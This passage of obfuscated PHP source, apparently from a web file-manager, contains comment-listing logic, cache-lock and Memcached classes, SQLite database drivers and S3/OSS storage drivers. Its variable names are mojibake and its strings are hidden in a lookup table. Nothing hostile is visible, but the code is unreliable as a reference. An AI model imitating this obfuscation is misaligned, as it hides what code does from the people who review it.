array($‰»Ìßõã[677] => $ˆé¤×“, $‰»Ìßõã[678] => $¨ˆ²µ¯İ); $Ñ¶Í«Û– = $this->where($†‹¬‚ä§)->count(); $¼’¼» = "\122\111\107\x48\124\x20\112\x4f\x49\116\x20{$this->tablePrefix}\x63\157\155\155\145\156\164\137\x70\162\141\x69\163\145\40\x73\x74\x61\162\x20\x6f\156\x20\143\x6f\x6d\x6d\x65\156\x74\56\143\157\x6d\155\145\x6e\164\111\x44\x20\75\x20\x73\164\x61\162\x2e\x63\x6f\155\x6d\x65\x6e\x74\111\104"; $ßÊì‘¹¤ = $this->alias($‰»Ìßõã[430])->where($†‹¬‚ä§)->join($¼’¼», $‰»Ìßõã[2168])->count(); $á‚±Ìã« = array($‰»Ìßõã[2169] => $Ñ¶Í«Û–, $‰»Ìßõã[2170] => $ßÊì‘¹¤); return $á‚±Ìã«; } public function listData($ñÇŒ¦ã‹) { $èì€˜‰Á =& $_SERVER[€ä¾™²]; if (isset($ñÇŒ¦ã‹[$èì€˜‰Á[2171]])) { if ($ñÇŒ¦ã‹[$èì€˜‰Á[2171]]) { $ñÇŒ¦ã‹[$èì€˜‰Á[2164]] = array($èì€˜‰Á[1127], intval($ñÇŒ¦ã‹[$èì€˜‰Á[2171]])); } unset($ñÇŒ¦ã‹[$èì€˜‰Á[2171]]); } if (isset($ñÇŒ¦ã‹[$èì€˜‰Á[2172]])) { if ($ñÇŒ¦ã‹[$èì€˜‰Á[2172]]) { $ñÇŒ¦ã‹[$èì€˜‰Á[2164]] = array($èì€˜‰Á[1124], intval($ñÇŒ¦ã‹[$èì€˜‰Á[2172]])); } unset($ñÇŒ¦ã‹[$èì€˜‰Á[2172]]); } return $this->_listData($ñÇŒ¦ã‹); } private function _listData($íÈñÀö¥) { $Î™Èè—¥ =& $_SERVER[€ä¾™²]; $Ê””ÂÓí = $this->where($íÈñÀö¥)->_makeOrder()->selectPage(100); $this->_listAppendParent($Ê””ÂÓí[$Î™Èè—¥[446]]); $this->_listAppendUser($Ê””ÂÓí[$Î™Èè—¥[446]]); $this->_listAppendMeta($Ê””ÂÓí[$Î™Èè—¥[446]]); return $Ê””ÂÓí; } private function _makeOrder() { $ë‹É×Ú¿ =& $_SERVER[€ä¾™²]; $´÷ˆÑõŸ = array($ë‹É×Ú¿[2159], $ë‹É×Ú¿[2158], $ë‹É×Ú¿[232]); $ö±½ˆ³ = Input::get($ë‹É×Ú¿[551], $ë‹É×Ú¿[7], $ë‹É×Ú¿[519], $´÷ˆÑõŸ); $ÑÁÈ„•¤ = Input::get($ë‹É×Ú¿[552], $ë‹É×Ú¿[7], $ë‹É×Ú¿[1915], array($ë‹É×Ú¿[2173], $ë‹É×Ú¿[547])); $‹³Šèâ = $ö±½ˆ³ . $ë‹É×Ú¿[53] . $ÑÁÈ„•¤; return $this->order($‹³Šèâ); } private function _listAppendParent(&$¥ÂûÍğò) { $ë‘ÉÄ—™ =& $_SERVER[€ä¾™²]; $âÍ”ù„ì = array_unique(array_to_keyvalue($¥ÂûÍğò, $ë‘ÉÄ—™[12], $ë‘ÉÄ—™[2156])); $âÍ”ù„ì = array_remove_value($âÍ”ù„ì, $ë‘ÉÄ—™[229]); if (!$âÍ”ù„ì) { return; } $“âö·ÈË = $this->where(array($ë‘ÉÄ—™[2157] => array($ë‘ÉÄ—™[7], $âÍ”ù„ì)))->select(); $“âö·ÈË = array_to_keyvalue($“âö·ÈË, $ë‘ÉÄ—™[2164]); foreach ($¥ÂûÍğò as &$à‰â§) { if (isset($“âö·ÈË[$à‰â§[$ë‘ÉÄ—™[2156]]])) { $à‰â§[$ë‘ÉÄ—™[2174]] = $“âö·ÈË[$à‰â§[$ë‘ÉÄ—™[2156]]]; } } unset($à‰â§); } private function _listAppendUser(&$÷®®¼Ìâ) { $§İÈ·¤‹ =& $_SERVER[€ä¾™²]; $ £ÍäÛğ = array_unique(array_to_keyvalue($÷®®¼Ìâ, $§İÈ·¤‹[12], $§İÈ·¤‹[1539])); $ £ÍäÛğ = array_remove_value($ £ÍäÛğ, $§İÈ·¤‹[229]); if (count($ £ÍäÛğ) == 0) { return; } foreach ($÷®®¼Ìâ as $÷¹„Ë) { if (isset($÷¹„Ë[$§İÈ·¤‹[2174]])) { $ £ÍäÛğ[] = $÷¹„Ë[$§İÈ·¤‹[2174]][$§İÈ·¤‹[1539]]; } } $Á–Ì¾ôÒ = Model($§İÈ·¤‹[624])->userListInfo($ £ÍäÛğ); foreach ($÷®®¼Ìâ as &$÷¹„Ë) { $÷¹„Ë[$§İÈ·¤‹[691]] = $Á–Ì¾ôÒ[$÷¹„Ë[$§İÈ·¤‹[1539]]]; if (isset($÷¹„Ë[$§İÈ·¤‹[2174]])) { $÷¹„Ë[$§İÈ·¤‹[2174]][$§İÈ·¤‹[691]] = $Á–Ì¾ôÒ[$÷¹„Ë[$§İÈ·¤‹[2174]][$§İÈ·¤‹[1539]]]; } } unset($÷¹„Ë); } private function _listAppendMeta(&$¬å³‹Éå) { $İ–ÆŠıÎ =& $_SERVER[€ä¾™²]; $‰¨¬»¾Œ = array_unique(array_to_keyvalue($¬å³‹Éå, $İ–ÆŠıÎ[12], $İ–ÆŠıÎ[2164])); $‰¨¬»¾Œ = array_remove_value($‰¨¬»¾Œ, $İ–ÆŠıÎ[229]); if (!$‰¨¬»¾Œ) { return; } foreach ($¬å³‹Éå as $ÃÇ„û£») { if (isset($ÃÇ„û£»[$İ–ÆŠıÎ[2174]])) { $‰¨¬»¾Œ[] = $ÃÇ„û£»[$İ–ÆŠıÎ[2174]][$İ–ÆŠıÎ[2164]]; } } $äáğ»¦ = $this->metaList($‰¨¬»¾Œ); if (!$äáğ»¦) { return !1; } foreach ($¬å³‹Éå as &$ÃÇ„û£») { $ÃÇ„û£»[$İ–ÆŠıÎ[562]] = $äáğ»¦[$ÃÇ„û£»[$İ–ÆŠıÎ[2164]]]; if (isset($ÃÇ„û£»[$İ–ÆŠıÎ[2174]])) { $ÃÇ„û£»[$İ–ÆŠıÎ[2174]][$İ–ÆŠıÎ[562]] = $äáğ»¦[$ÃÇ„û£»[$İ–ÆŠıÎ[2174]][$İ–ÆŠıÎ[2164]]]; } } unset($ÃÇ„û£»); } private function metaList($×³¶ƒ¾Ú) { $˜ªÚÒİì =& $_SERVER[€ä¾™²]; if (!$×³¶ƒ¾Ú) { return array(); } $õÅş¸Ê = array($˜ªÚÒİì[2164] => array($˜ªÚÒİì[7], $×³¶ƒ¾Ú)); $•ÓÉÃå = Model($˜ªÚÒİì[2175])->where($õÅş¸Ê)->select(); $•ÓÉÃå = array_to_keyvalue_group($•ÓÉÃå, $˜ªÚÒİì[2164]); foreach ($•ÓÉÃå as $Í‰µÁ¯ => $á—ª„»ì) { $‘½Ñ¾ô = array(); foreach ($á—ª„»ì as $¬¡¶æÉş) { $‘½Ñ¾ô[$¬¡¶æÉş[$˜ªÚÒİì[95]]] = $¬¡¶æÉş[$˜ªÚÒİì[451]]; } $•ÓÉÃå[$Í‰µÁ¯] = $‘½Ñ¾ô; } return $•ÓÉÃå ? $•ÓÉÃå : array(); } public function removeTarget($Èü¨ß±, $‹ƒÜÂóè) { $µ’¸ó¿Ë =& $_SERVER[€ä¾™²]; if (!$‹ƒÜÂóè) { return !0; } $‹ƒÜÂóè = is_array($‹ƒÜÂóè) ? $‹ƒÜÂóè : array($‹ƒÜÂóè); $•¿ò…Ğ… = array($µ’¸ó¿Ë[189] => $Èü¨ß±, $µ’¸ó¿Ë[596] => array($µ’¸ó¿Ë[7], $‹ƒÜÂóè)); $Š°ã—¡« = $this->field($µ’¸ó¿Ë[2164])->where($•¿ò…Ğ…)->select(); $ü©¹ğÏ = array_to_keyvalue($Š°ã—¡«, $µ’¸ó¿Ë[12], $µ’¸ó¿Ë[2164]); return $this->removeArray($ü©¹ğÏ); } public function removeArray($Ô§çáÃ) { $‡œª„ÉŸ =& $_SERVER[€ä¾™²]; if (!$Ô§çáÃ) { return !0; } $Ô§çáÃ = is_array($Ô§çáÃ) ? $Ô§çáÃ : array($Ô§çáÃ); $ŒªØäğ– = array($‡œª„ÉŸ[2164] => array($‡œª„ÉŸ[7], $Ô§çáÃ)); Model($‡œª„ÉŸ[2167])->where($ŒªØäğ–)->delete(); Model($‡œª„ÉŸ[2176])->where($ŒªØäğ–)->delete(); return $this->where($ŒªØäğ–)->delete(); } } goto eÄõñ¹¡†·; AëõƒŒ¨ª: class CacheLockMemcached { public function lock($»ğ«ŒÒ÷, $Ä¼ÃçéÒ = 0) { $¯ôÅÊÑ = Cache::init(); $û‘‡Úè = microtime(!0) + $Ä¼ÃçéÒ; while (microtime(!0) < $û‘‡Úè) { $¾ÂÌˆ³à = $¯ôÅÊÑ->get($»ğ«ŒÒ÷); if (!$¾ÂÌˆ³à || $¾ÂÌˆ³à < microtime(!0)) { $ÀúÙªò = $¯ôÅÊÑ->handle->add($»ğ«ŒÒ÷, $û‘‡Úè, $Ä¼ÃçéÒ); if ($ÀúÙªò) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($İã±Ş¢) { return Cache::init()->get($İã±Ş¢); } public function unlock($–æ¤¦Ò‹) { return Cache::init()->remove($–æ¤¦Ò‹); } } class CacheLockDatabase { public function lock($‘ùŒ•Ôµ, $âéçÅÚ¯ = 0) { $¾¶ñ¢ğÃ = Model($_SERVER[€ä¾™²][936]); $ı¨ôşÃÕ = microtime(!0) + $âéçÅÚ¯; while (microtime(!0) < $ı¨ôşÃÕ) { $¾—±Õ“ = $¾¶ñ¢ğÃ->get($‘ùŒ•Ôµ); if (!$¾—±Õ“ || $¾—±Õ“ < microtime(!0)) { $±‚„Ìó = $¾¶ñ¢ğÃ->set($‘ùŒ•Ôµ, $ı¨ôşÃÕ); if ($±‚„Ìó) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($‚ï¸‘–×) { return Model($_SERVER[€ä¾™²][936])->get($‚ï¸‘–×); } public function unlock($îè²İÓ) { Model($_SERVER[€ä¾™²][936])->remove($îè²İÓ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Ä­òâú´, $½â„“™•) { $ãİ‹¹Şõ =& $_SERVER[€ä¾™²]; if (!class_exists($ãİ‹¹Şõ[978])) { show_json($ãİ‹¹Şõ[979], !1); } $this->cacheTime = $½â„“™•; $this->handle = new Memcached(); if (is_array($Ä­òâú´[$ãİ‹¹Şõ[980]]) && count($Ä­òâú´[$ãİ‹¹Şõ[980]]) >= 1) { foreach ($Ä­òâú´[$ãİ‹¹Şõ[980]] as $Ğš€Û¢ß) { $¥†úŒ = explode($ãİ‹¹Şõ[4], $Ğš€Û¢ß); $this->handle->addServer($¥†úŒ[0], $¥†úŒ[1]); } } else { $this->handle->addServer($Ä­òâú´[$ãİ‹¹Şõ[207]], $Ä­òâú´[$ãİ‹¹Şõ[208]]); } } public function set($Ò™€è‘, $—‹†¶Ë¤, $ğÇ™ø² = false) { $ğÇ™ø² = $ğÇ™ø² ? $ğÇ™ø² : $this->cacheTime; return $this->handle->set($Ò™€è‘, $—‹†¶Ë¤, $ğÇ™ø²); } public function get($öØ¬ñÇÁ) { return $this->handle->get($öØ¬ñÇÁ); } public function remove($—òÖÔ‚¶) { return $this->handle->delete($—òÖÔ‚¶); } public function deleteAll() { return $this->handle->flush(); } } goto C¹ƒ»‚×í; D¬†ßŒî¯¾: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($•‘ù•÷‚) { $ƒ”ÁÒ©… =& $_SERVER[€ä¾™²]; parent::__construct($•‘ù•÷‚); $ÙëÖ ¤à = isset($•‘ù•÷‚[$ƒ”ÁÒ©…[257]]) && $•‘ù•÷‚[$ƒ”ÁÒ©…[257]] == $ƒ”ÁÒ©…[248] ? $ƒ”ÁÒ©…[248] : $ƒ”ÁÒ©…[314]; $this->setSignVersion($ÙëÖ ¤à); } public function link($Â—ÕùÇ¹, $‰ÆçšĞé = array()) { return parent::link($Â—ÕùÇ¹, $‰ÆçšĞé); } public function fileOut($÷†ŸÍ, $ß÷Í„ó­ = false, $ÀŒóÛù = false, $üß‹½ñ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[€ä¾™²][315])) { return parent::fileOutServer($÷†ŸÍ, $ß÷Í„ó­, $ÀŒóÛù, $üß‹½ñ); } parent::fileOut($÷†ŸÍ, $ß÷Í„ó­, $ÀŒóÛù, $üß‹½ñ); } public function fileOutImage($â£Òõà, $ı·Ê¸ıÀ = 250) { if (strstr($this->endpoint, $_SERVER[€ä¾™²][315])) { return parent::fileOutImageServer($â£Òõà, $ı·Ê¸ıÀ); } parent::fileOutImage($â£Òõà, $ı·Ê¸ıÀ); } } define($_SERVER[€ä¾™²][316], 1); define($_SERVER[€ä¾™²][317], 2); goto c‚Õ’ÇÔ‡á; DÖ­Ïµ•¿ì: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Ã†Ñø§¬ =& $_SERVER[€ä¾™²]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Ã†Ñø§¬[6]] =& $config; $this->values[$Ã†Ñø§¬[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Ã†Ñø§¬[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ûô•Ûö) { if (1 === func_num_args()) { $this->{$ûô•Ûö} = new $ûô•Ûö(); } else { $Áúèâ˜¬ = new ReflectionClass($ûô•Ûö); $Íû¯ùøÉ = func_get_args(); array_shift($Íû¯ùøÉ); $this->{$ûô•Ûö} = $Áúèâ˜¬->newInstanceArgs($Íû¯ùøÉ); } return $this->{$ûô•Ûö}; } public function routeBind($ñü®„Ş¬, $¼òšÇŸš, $±˜â° = 3) { $ä¤òŒ×³ =& $_SERVER[€ä¾™²]; $¦ŸîµõĞ = $this->in[$ä¤òŒ×³[9]]; $ñü®„Ş¬ = str_replace($ä¤òŒ×³[10], $ä¤òŒ×³[11], trim(trim($ñü®„Ş¬, $ä¤òŒ×³[8]), $ä¤òŒ×³[12])); if (!$ñü®„Ş¬ || count($¦ŸîµõĞ) <= $±˜â°) { return !1; } $‰ò±şå» = !0; $ğ¼×Œå™ = explode($ä¤òŒ×³[8], $ñü®„Ş¬); for ($ôÂÏ· = 0; $ôÂÏ· < count($ğ¼×Œå™); $ôÂÏ·++) { if ($ğ¼×Œå™[$ôÂÏ·] != $¦ŸîµõĞ[$±˜â° + $ôÂÏ·]) { $‰ò±şå» = !1; break; } } if (!$‰ò±şå») { return; } call_user_func_array(array($this, $¼òšÇŸš), array()); } public function routeArgs($Ò¬ÖÀÒ™ = 3) { $…¦ìÙ¶÷ = $this->in[$_SERVER[€ä¾™²][9]]; if (count($…¦ìÙ¶÷) <= $Ò¬ÖÀÒ™) { return array(); } $öìğÈ˜ = array(); for ($ô©†ş˜½ = $Ò¬ÖÀÒ™; $ô©†ş˜½ < count($…¦ìÙ¶÷); $ô©†ş˜½ += 2) { $öìğÈ˜[$…¦ìÙ¶÷[$ô©†ş˜½]] = $…¦ìÙ¶÷[$ô©†ş˜½ + 1]; $this->in[$…¦ìÙ¶÷[$ô©†ş˜½]] = $…¦ìÙ¶÷[$ô©†ş˜½ + 1]; } return $öìğÈ˜; } protected function assign($àéöÕÙ·, $âÚÉ€İ¶) { $this->values[$àéöÕÙ·] = $âÚÉ€İ¶; } protected function display($äìñøù) { ob_end_clean(); extract($this->values); require $this->tpl . $äìñøù; } } class DbSqliteBase extends Db { public function __construct($°’ƒ”Â£ = '') { $•›¤ĞÙá =& $_SERVER[€ä¾™²]; if (!extension_loaded($•›¤ĞÙá[13])) { think_exception(think_lang($•›¤ĞÙá[14]) . $•›¤ĞÙá[15]); } if (!empty($°’ƒ”Â£)) { if (!isset($°’ƒ”Â£[$•›¤ĞÙá[16]])) { $°’ƒ”Â£[$•›¤ĞÙá[16]] = 438; } $this->config = $°’ƒ”Â£; if (empty($this->config[$•›¤ĞÙá[17]])) { $this->config[$•›¤ĞÙá[17]] = array(); } } } public function connect($úÁòŸÓÌ = '', $Øî§ Ë¾ = 0) { $í¢ÚÁÛâ =& $_SERVER[€ä¾™²]; if (!isset($this->linkID[$Øî§ Ë¾])) { if (empty($úÁòŸÓÌ)) { $úÁòŸÓÌ = $this->config; } $°ç’·ì = !empty($úÁòŸÓÌ[$í¢ÚÁÛâ[17]][$í¢ÚÁÛâ[18]]) ? $úÁòŸÓÌ[$í¢ÚÁÛâ[17]][$í¢ÚÁÛâ[18]] : $this->pconnect; $°•ˆö±÷ = $°ç’·ì ? $í¢ÚÁÛâ[19] : $í¢ÚÁÛâ[20]; $this->linkID[$Øî§ Ë¾] = $°•ˆö±÷($úÁòŸÓÌ[$í¢ÚÁÛâ[21]], $úÁòŸÓÌ[$í¢ÚÁÛâ[16]]); if (!$this->linkID[$Øî§ Ë¾]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Øî§ Ë¾], 30000); if (1 != think_config($í¢ÚÁÛâ[22])) { unset($this->config); } } return $this->linkID[$Øî§ Ë¾]; } public function free() { $this->queryID = null; } public function query($ğÇå‹¨ƒ) { $Î¿ÕÏÄí =& $_SERVER[€ä¾™²]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ğÇå‹¨ƒ; if ($this->queryID) { $this->free(); } think_action_status($Î¿ÕÏÄí[23], 1); think_status($Î¿ÕÏÄí[24]); $this->queryID = sqlite_query($this->_linkID, $ğÇå‹¨ƒ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $â¦À®‰Í = $this->getAll(); return $â¦À®‰Í; } } public function execute($‚ŠŠ–±) { $±÷¨§¥Ö =& $_SERVER[€ä¾™²]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‚ŠŠ–±; if ($this->queryID) { $this->free(); } think_action_status($±÷¨§¥Ö[25], 1); think_status($±÷¨§¥Ö[24]); $Ñœ÷ú‡‡ = sqlite_exec($this->_linkID, $‚ŠŠ–±); $this->debug(); if (!1 === $Ñœ÷ú‡‡) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[€ä¾™²][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $½ü¬Æœí = sqlite_query($this->_linkID, $_SERVER[€ä¾™²][27]); if (!$½ü¬Æœí) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $…ÑŸ¦ß = sqlite_query($this->_linkID, $_SERVER[€ä¾™²][28]); if (!$…ÑŸ¦ß) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Æê—Ç¼³ = array(); if ($this->numRows > 0) { for ($®ºº„Š = 0; $®ºº„Š < $this->numRows; $®ºº„Š++) { $Æê—Ç¼³[$®ºº„Š] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Æê—Ç¼³; } public function getFields($ÖÎ“ÏÅ) { $·Ä‹¿ò =& $_SERVER[€ä¾™²]; $÷Èıî¸Ì = $this->query($·Ä‹¿ò[29] . $ÖÎ“ÏÅ . $·Ä‹¿ò[30]); $æøèÃÕä = array(); if ($÷Èıî¸Ì) { foreach ($÷Èıî¸Ì as $ÚØİÙ€ => $êÌÖŠ»ø) { $æøèÃÕä[$êÌÖŠ»ø[$·Ä‹¿ò[31]]] = array($·Ä‹¿ò[32] => $êÌÖŠ»ø[$·Ä‹¿ò[31]], $·Ä‹¿ò[33] => $êÌÖŠ»ø[$·Ä‹¿ò[34]], $·Ä‹¿ò[35] => (bool) ($êÌÖŠ»ø[$·Ä‹¿ò[36]] === $·Ä‹¿ò[12]), $·Ä‹¿ò[37] => $êÌÖŠ»ø[$·Ä‹¿ò[38]], $·Ä‹¿ò[39] => strtolower($êÌÖŠ»ø[$·Ä‹¿ò[40]]) == $·Ä‹¿ò[41], $·Ä‹¿ò[42] => strtolower($êÌÖŠ»ø[$·Ä‹¿ò[43]]) == $·Ä‹¿ò[44]); } } return $æøèÃÕä; } public function getTables($Şõøº¡¢ = '') { $œù­Ñé =& $_SERVER[€ä¾™²]; $‹î‚ì Ô = $this->query($œù­Ñé[45] . $œù­Ñé[46] . $œù­Ñé[47]); $ÌÇıÒõÓ = array(); foreach ($‹î‚ì Ô as $ó°¼ÕÎ× => $ÕÄ¸Î”§) { $ÌÇıÒõÓ[$ó°¼ÕÎ×] = current($ÕÄ¸Î”§); } return $ÌÇıÒõÓ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $å¨Ò¦àĞ =& $_SERVER[€ä¾™²]; $îŒ«¼Ê’ = sqlite_last_error($this->_linkID); $this->error = $îŒ«¼Ê’ . $å¨Ò¦àĞ[4] . sqlite_error_string($îŒ«¼Ê’); if ($å¨Ò¦àĞ[12] != $this->queryStr) { $this->error .= LNG($å¨Ò¦àĞ[48]) . $this->queryStr; } think_trace($this->error, $å¨Ò¦àĞ[12], $å¨Ò¦àĞ[49]); return $this->error; } public function escapeString($•©”€÷²) { return sqlite_escape_string($•©”€÷²); } public function parseLimit($Å¼ÉÅ») { $¥¾åŸÇ« =& $_SERVER[€ä¾™²]; $Å©üÃÁ£ = $¥¾åŸÇ«[12]; if (!empty($Å¼ÉÅ»)) { $Å¼ÉÅ» = explode($¥¾åŸÇ«[50], $Å¼ÉÅ»); if (count($Å¼ÉÅ») > 1) { $Å©üÃÁ£ .= $¥¾åŸÇ«[51] . $Å¼ÉÅ»[1] . $¥¾åŸÇ«[52] . $Å¼ÉÅ»[0] . $¥¾åŸÇ«[53]; } else { $Å©üÃÁ£ .= $¥¾åŸÇ«[51] . $Å¼ÉÅ»[0] . $¥¾åŸÇ«[53]; } } return $Å©üÃÁ£; } } class DbSqlite3Base extends Db { public function __construct($½Ğºˆªé = '') { $ùóˆÙ Ö =& $_SERVER[€ä¾™²]; if (!class_exists($ùóˆÙ Ö[54])) { think_exception(think_lang($ùóˆÙ Ö[14]) . $ùóˆÙ Ö[55]); } if (!empty($½Ğºˆªé)) { if (!isset($½Ğºˆªé[$ùóˆÙ Ö[16]])) { $½Ğºˆªé[$ùóˆÙ Ö[16]] = 438; } $this->config = $½Ğºˆªé; if (empty($this->config[$ùóˆÙ Ö[17]])) { $this->config[$ùóˆÙ Ö[17]] = array(); } } } public function connect($ß×ÎÑ§ƒ = '', $éåÏŞºá = 0) { $‚Ä×ª Î =& $_SERVER[€ä¾™²]; if (!isset($this->linkID[$éåÏŞºá])) { if (empty($ß×ÎÑ§ƒ)) { $ß×ÎÑ§ƒ = $this->config; } $this->linkID[$éåÏŞºá] = new SQLite3($ß×ÎÑ§ƒ[$‚Ä×ª Î[21]]); if (!$this->linkID[$éåÏŞºá]) { think_exception($this->linkID[$éåÏŞºá]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$éåÏŞºá]->busyTimeout(30000); if (1 != think_config($‚Ä×ª Î[22])) { unset($this->config); } } return $this->linkID[$éåÏŞºá]; } public function free() { $this->queryID = null; } public function query($¶óç°÷ª) { $¼Óé˜Î‡ =& $_SERVER[€ä¾™²]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¶óç°÷ª; if ($this->queryID) { $this->free(); } think_action_status($¼Óé˜Î‡[23], 1); think_status($¼Óé˜Î‡[24]); $this->queryID = $this->_linkID->query($¶óç°÷ª); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $²êÆÂ®é = $this->getAll(); $this->numRows = count($²êÆÂ®é); return $²êÆÂ®é; } } public function execute($û¹î£¤) { $·õµÈ› =& $_SERVER[€ä¾™²]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $û¹î£¤; if ($this->queryID) { $this->free(); } think_action_status($·õµÈ›[25], 1); think_status($·õµÈ›[24]); $ëëÓˆÈ£ = $this->_linkID->exec($û¹î£¤); $this->debug(); if (!1 === $ëëÓˆÈ£) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[€ä¾™²][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $©’æ®üœ = $this->_linkID->query($_SERVER[€ä¾™²][27]); if (!$©’æ®üœ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ó“Ëıò“ = $this->_linkID->query($_SERVER[€ä¾™²][28]); if (!$Ó“Ëıò“) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¹ış‰Ùœ = array(); while ($ìò‡²Òı = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $¹ış‰Ùœ[] = $ìò‡²Òı; } $this->queryID->reset(); return $¹ış‰Ùœ; } public function getFields($¢îüĞùÅ) { $˜Áù‡é =& $_SERVER[€ä¾™²]; $‘åŸ ªá = $this->query($˜Áù‡é[29] . $¢îüĞùÅ . $˜Áù‡é[30]); $†«Š¼šÔ = array(); if ($‘åŸ ªá) { foreach ($‘åŸ ªá as $òÅøúï· => $¤ĞÄë€÷) { $†«Š¼šÔ[$¤ĞÄë€÷[$˜Áù‡é[32]]] = array($˜Áù‡é[32] => $¤ĞÄë€÷[$˜Áù‡é[32]], $˜Áù‡é[33] => $¤ĞÄë€÷[$˜Áù‡é[33]], $˜Áù‡é[35] => (bool) ($¤ĞÄë€÷[$˜Áù‡é[35]] === $˜Áù‡é[12]), $˜Áù‡é[37] => $¤ĞÄë€÷[$˜Áù‡é[56]], $˜Áù‡é[39] => (bool) $¤ĞÄë€÷[$˜Áù‡é[57]], $˜Áù‡é[42] => (bool) $¤ĞÄë€÷[$˜Áù‡é[57]]); } } return $†«Š¼šÔ; } public function getTables($ÑËŠ­©Õ = '') { $±ØÑ¤â­ =& $_SERVER[€ä¾™²]; $û±¿¸Ñ = $this->query($±ØÑ¤â­[45] . $±ØÑ¤â­[46] . $±ØÑ¤â­[47]); $áÆ¼ÄÌê = array(); foreach ($û±¿¸Ñ as $ëÂÛ®Êé => $àÒõ‹Í) { $áÆ¼ÄÌê[$ëÂÛ®Êé] = current($àÒõ‹Í); } return $áÆ¼ÄÌê; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $»¿½Ğ =& $_SERVER[€ä¾™²]; $this->error = $this->_linkID->lastErrorMsg(); if ($»¿½Ğ[12] != $this->queryStr) { $this->error .= LNG($»¿½Ğ[48]) . $this->queryStr; } think_trace($this->error, $»¿½Ğ[12], $»¿½Ğ[49]); return $this->error; } public function escapeString($ÉèÃ¯š) { $¦şâ¦ì =& $_SERVER[€ä¾™²]; if ($this->_linkID) { return $this->_linkID->escapeString($ÉèÃ¯š); } return str_ireplace($¦şâ¦ì[58], $¦şâ¦ì[59], $ÉèÃ¯š); } public function parseLimit($ûæ”¾å) { $´Çõá× =& $_SERVER[€ä¾™²]; $ƒ¥ÏŞõ­ = $´Çõá×[12]; if (!empty($ûæ”¾å)) { $ûæ”¾å = explode($´Çõá×[50], $ûæ”¾å); if (count($ûæ”¾å) > 1) { $ƒ¥ÏŞõ­ .= $´Çõá×[51] . $ûæ”¾å[1] . $´Çõá×[52] . $ûæ”¾å[0] . $´Çõá×[53]; } else { $ƒ¥ÏŞõ­ .= $´Çõá×[51] . $ûæ”¾å[0] . $´Çõá×[53]; } } return $ƒ¥ÏŞõ­; } } goto D®Ä¿‹‚˜’; b´øƒ¸­ƒ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ªë›Õç½) { parent::__construct($ªë›Õç½); $this->setSignVersion($_SERVER[€ä¾™²][248]); } public function uploadFormData($¢îáªŸ…, $ƒ€Ù™ = 3600) { return $this->uploadFormDataV2($¢îáªŸ…, $ƒ€Ù™); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($Òã£¨»é) { parent::__construct(); include_once SDK_DIR . $_SERVER[€ä¾™²][1616]; $this->_init($Òã£¨»é); } public function _init($÷µä•©Ê) { $¦œ­¼¹ =& $_SERVER[€ä¾™²]; $this->config = $÷µä•©Ê; foreach ($÷µä•©Ê as $ı¨ó¥á„ => $‹ÒÓîïŒ) { if (isset($this->{$ı¨ó¥á„})) { $this->{$ı¨ó¥á„} = $‹ÒÓîïŒ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¦œ­¼¹[1617] . LNG($¦œ­¼¹[1618])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $‹Ü‰şÂ =& $_SERVER[€ä¾™²]; $½ò‰ïî = new OSS\Model\CorsConfig(); $´õ¹ğÉû = new OSS\Model\CorsRule(); $´õ¹ğÉû->addAllowedOrigin($‹Ü‰şÂ[1619]); $´õ¹ğÉû->addAllowedMethod($‹Ü‰şÂ[1620]); $´õ¹ğÉû->addAllowedMethod($‹Ü‰şÂ[1621]); $´õ¹ğÉû->addAllowedMethod($‹Ü‰şÂ[1622]); $´õ¹ğÉû->addAllowedMethod($‹Ü‰şÂ[1623]); $´õ¹ğÉû->addAllowedMethod($‹Ü‰şÂ[163]); 